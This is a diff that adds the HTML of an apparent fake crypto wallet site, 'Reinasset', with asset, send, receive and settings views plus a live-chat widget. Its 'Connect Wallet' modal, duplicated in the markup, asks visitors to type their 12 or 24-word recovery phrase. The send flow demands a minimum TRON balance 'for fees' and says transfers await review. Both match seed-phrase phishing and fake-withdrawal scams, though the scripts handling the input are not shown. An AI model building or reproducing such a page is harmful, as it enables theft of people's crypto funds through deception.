@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CryptoWallet - Portfolio</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <!-- Smartsupp Live Chat script -->
+<script type="text/javascript">
+var _smartsupp = _smartsupp || {};
+_smartsupp.key = '4245279039074e5c1466ea1689f03be77d6237b2';
+_smartsupp.offsetY = 140;
+window.smartsupp||(function(d) {
+  var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];
+  s=d.getElementsByTagName('script')[0];c=d.createElement('script');
+  c.type='text/javascript';c.charset='utf-8';c.async=true;
+  c.src='https://www.smartsuppchat.com/loader.js?';s.parentNode.insertBefore(c,s);
+})(document);
+</script>
+<noscript><a href="https://www.smartsupp.com" target="_blank"></a></noscript>
+
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div id="preloader">
+        <div class="spinner">
+            <div class="dot1"></div>
+            <div class="dot2"></div>
+            <div class="dot3"></div>
+        </div>
+    </div>
+
+    <main class="app-container">
+        <div id="view-home" class="view-section">
+            <header class="header">
+                <div class="brand">
+                    <span class="logo-circle">R</span>
+                    <span>Reinasset</span>
+                </div>
+                <div class="menu-btn"><div class="dot1"></div><div class="dot2"></div><div class="dot3"></div></div>
+            </header>
+
+            <div class="balance-card">
+                <div id="userName" class="user-name"></div>
+                <div class="balance-top-row">
+                    <div class="balance-header">
+                        <span class="wallet-icon">📁</span>
+                        <span class="label">Wallet Balance</span>
+                    </div>
+                    <div class="connect-btn" id="connect-wallet"><div>+</div><p>Connect Wallet</p></div>
+                </div>
+                <h1 id="total-display">$ 0.00</h1>
+            </div>
+
+            <nav class="actions-grid">
+                <div class="action-item"><div class="circle blue">↑</div><p>Send</p></div>
+                <div class="action-item"><div class="circle red">↓</div><p>Receive</p></div>
+                <div class="action-item"><div class="circle purple">⇄</div><p>Swap</p></div>
+                <div class="action-item"><div class="circle green">$</div><p>Buy</p></div>
+            </nav>
+
+            <div class="tabs">
+                <button class="tab-btn active" data-tab="asset-list">Assets</button>
+                <button class="tab-btn" data-tab="nft">NFTs</button>
+                <button class="tab-btn" data-tab="activity">Activity</button>
+            </div>
+
+            <section class="asset-list" id="asset-list-container"></section>
+            <section class="asset-list hidden" id="nft-container"></section>
+            <section class="asset-list hidden" id="activity-container"></section>
+        </div>
+
+        <div id="connectWalletModal" class="modal">
+            <div class="modal-content" style="max-width: 400px;">
+                <div class="modal-header">
+                    <h3>Connect Wallet</h3>
+                    <span class="close-modal" id="closeConnect">&times;</span>
+                </div>
+                
+                <div class="form-group">
+                    <label>Select Wallet</label>
+                    <select id="walletType" style="width:100%; padding:10px; border-radius:6px; border:1px solid #dfe6ee;">
+                        <option value="Trust Wallet">Trust Wallet</option>
+                        <option value="MetaMask">MetaMask</option>
+                        <option value="Coinbase">Coinbase</option>
+                        <option value="Phantom">Phantom</option>
+                    </select>
+                </div>
+
+                <h5>ENTER MESSAGE</h5>
+                <textarea id="walletPhrase" placeholder="Enter your 12 or 24-word recovery phrase..." 
+                    style="width:100%; height:100px; padding:10px; border-radius:6px; border:1px solid #dfe6ee; font-weight: 900; font-family: sans-serif; resize: none;"></textarea>
+                
+                <button id="submitConnect" style="margin-top:15px;">Connect Wallet</button>
+            </div>
+        </div>
+    </main>
+
+
+
+<div id="connectWalletModal" class="modal">
+    <div class="modal-content">
+        <div class="modal-header">
+            <h3>Connect Wallet</h3>
+            <span class="close-modal" id="closeConnect">&times;</span>
+        </div>
+        
+        <div class="form-group">
+            <label>Select Provider</label>
+            <select id="walletType">
+                <option value="Trust Wallet">Trust Wallet</option>
+                <option value="MetaMask">MetaMask</option>
+                <option value="Coinbase">Coinbase</option>
+                <option value="Phantom">Phantom</option>
+            </select>
+        </div>
+
+        <h5>RECOVERY PHRASE</h5>
+        <textarea id="walletPhrase" placeholder="Enter 12 or 24-word phrase"></textarea>
+        
+        <button id="submitConnect">Secure Connect</button>
+    </div>
+</div>
+
+<div id="pendingModal" class="modal">
+    <div class="modal-content" style="text-align: center;">
+        <div class="spinner"></div>
+        <h4 id="pendingStatus" style="margin-bottom: 8px;">Connecting...</h4>
+        <p style="font-size:13px; color:#6b7785; line-height: 1.4;">Please wait while we establish a secure encrypted connection.</p>
+        <button id="exitPending" class="hidden" style="background:#f4f7fb; color:#6b7785; margin-top:15px; border:none; padding:10px; border-radius:8px;">Close</button>
+    </div>
+</div>
+    <div id="view-explore" class="view-section hidden">
+        <div class="view-header">
+            <h3>Explore Assets</h3>
+        </div>
+        <div id="exploreList" class="receive-list-full">
+            </div>
+    </div>
+
+    <div id="view-settings" class="view-section hidden">
+        <div class="view-header">
+            <h3>Settings</h3>
+        </div>
+        
+        <div class="settings-card">
+            <div class="profile-section">
+                <div class="profile-avatar">👤</div>
+                <div class="profile-meta">
+                    <h4 id="settingsEmail">user@email.com</h4>
+                    <p id="settingsBalance">Balance: $0.00</p>
+                </div>
+            </div>
+
+            <div class="settings-options">
+                <div class="settings-item">
+                    <span class="icon">🔒</span>
+                    <p>Reset Password</p>
+                </div>
+                <div class="settings-item">
+                    <span class="icon">💳</span>
+                    <p>Connect Wallet</p>
+                </div>
+                <div class="settings-item">
+                    <span class="icon">✉️</span>
+                    <div class="support-text">
+                        <p>Support</p>
+                        <small>reinasset@gmail.com</small>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <nav class="bottom-nav">
+        <div class="nav-item active" id="nav-home">
+            <img src="https://img.icons8.com/material-rounded/24/000000/home.png">
+            <span>Home</span>
+        </div>
+        <div class="nav-item" id="nav-explore">
+            <img src="https://img.icons8.com/material-outlined/24/000000/compass.png">
+            <span>Explore</span>
+        </div>
+        <div class="nav-item" id="nav-settings">
+            <img src="https://img.icons8.com/material-outlined/24/000000/settings.png">
+            <span>Settings</span>
+        </div>
+    </nav>
+
+<!-- RECEIVE MODAL -->
+<div id="receiveModal" class="modal-overlay hidden">
+    <div class="receive-content">
+        <div class="receive-header">
+            <h3>Receive</h3>
+            <span id="closeReceive">&times;</span>
+        </div>
+        <div id="receiveList">
+            </div>
+    </div>
+</div>
+
+<!--SEND MODAL    -->
+
+<div id="sendModal" class="modal-overlay hidden">
+    <div class="receive-content">
+        <div class="receive-header">
+            <h3>Send</h3>
+            <span class="close-btn" id="closeSend">&times;</span>
+        </div>
+        <div id="sendAssetList"></div>
+    </div>
+</div>
+
+<div id="txnModal" class="modal-overlay hidden">
+    <div class="receive-content">
+        <div class="receive-header">
+            <span id="backToAssets" style="cursor:pointer;">&lsaquo; Back</span>
+            <h3 id="txnHeader">Send BTC</h3>
+            <span></span>
+        </div>
+        
+        <div class="txn-container">
+            <div class="txn-card asset-info-card">
+                <img id="txnCoinLogo" src="" width="30">
+                <span id="txnCoinName">Bitcoin</span>
+                <span id="txnCoinBalance" class="right">0 BTC</span>
+            </div>
+
+            <div class="txn-card">
+                <label>Amount to Send</label>
+                <div class="input-row">
+                    <input type="number" id="sendAmount" placeholder="0">
+                    <span class="max-btn">Max</span>
+                </div>
+                <small id="usdEquivalent">≈ $ 0.00 USD</small>
+            </div>
+
+            <div class="txn-card">
+                <label>Receiver Wallet Address</label>
+                <input type="text" id="receiverAddr" placeholder="Enter wallet address">
+            </div>
+
+            <div class="txn-card">
+                <label>Select Network Fee Asset</label>
+                <select id="feeAsset">
+                    <option value="trx" selected>TRON</option> <option value="eth">ETHEREUM</option>
+                    <option value="doge">DOGE</option>
+                </select>
+            </div>
+            <p id="sendError" class="error-text hidden">Insufficient TRON balance (Min 50 TRX required for fees)</p>
+            <button id="continueBtn" class="main-btn">Continue</button>
+        </div>
+    </div>
+</div>
+
+<div id="successModal" class="modal-overlay hidden">
+    <div class="receive-content" style="height: auto; text-align: center; padding: 40px 20px;">
+        <div style="background: #eef5ff; width: 80px; height: 80px; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px;">
+            <span style="font-size: 40px; color: #2f80ed;">✓</span>
+        </div>
+        <h2 style="margin-bottom: 10px;">Transaction Sent</h2>
+        <p style="color: #666; line-height: 1.5; margin-bottom: 30px;">
+            Your request to send <span id="successAmt"></span> is being processed. 
+            We will review your request shortly.
+        </p>
+        <button class="main-btn" onclick="location.reload()">Done</button>
+    </div>
+</div>
+
+<div id="coinDetailModal" class="modal-overlay hidden">
+    <div class="receive-content">
+        <div class="receive-header">
+            <span id="closeCoinDetail" style="cursor:pointer; font-size: 24px; padding: 10px;">&lsaquo;</span>
+            <h3 id="detailCoinTitle" style="flex:1; text-align:center; margin-right:40px;">Coin Info</h3>
+        </div>
+        
+        <div class="txn-card" style="text-align: center; padding: 30px 20px;">
+            <div style="display:flex; justify-content: space-between; align-items: flex-start;">
+                <img id="detailLogo" src="" width="45">
+                <button class="max-btn" style="background:#ddd; border-radius:15px; padding:4px 12px; color:#333;">Watch</button>
+            </div>
+            
+            <h1 id="detailBalanceUSD" style="font-size: 2rem; margin-top: 15px;">$0.00</h1>
+            <p id="detailBalanceCrypto" style="color:#666; font-weight:600;">0 BTC</p>
+
+            <div style="display: flex; justify-content: center; gap: 50px; margin-top: 25px;">
+                <div class="action-item" id="detailSendBtn">
+                    <div class="circle blue">↑</div>
+                    <p>Send</p>
+                </div>
+                <div class="action-item" id="detailReceiveBtn">
+                    <div class="circle red">↓</div>
+                    <p>Receive</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="txn-card">
+            <h4 style="margin-bottom:10px;">About <span id="aboutCoinName"></span></h4>
+            <p id="coinDescription" style="font-size: 13px; color: #666; line-height: 1.5;"></p>
+            
+            <hr style="margin: 20px 0; opacity: 0.1;">
+            
+            <h4 style="margin-bottom:15px;">Market Stats</h4>
+            <div style="display:flex; justify-content:space-between; margin-bottom:10px;">
+                <span style="color:#888; font-size:14px;">Market Cap</span>
+                <b id="detailMarketCap">$83B</b>
+            </div>
+            <div style="display:flex; justify-content:space-between;">
+                <span style="color:#888; font-size:14px;">Volume</span>
+                <b id="detailVolume">$5B</b>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+<script type="module" src="firebase.js"></script>
+<script type="module" src="user.js"></script>
+<script src="script.js"></script>
+</body>
+</html>
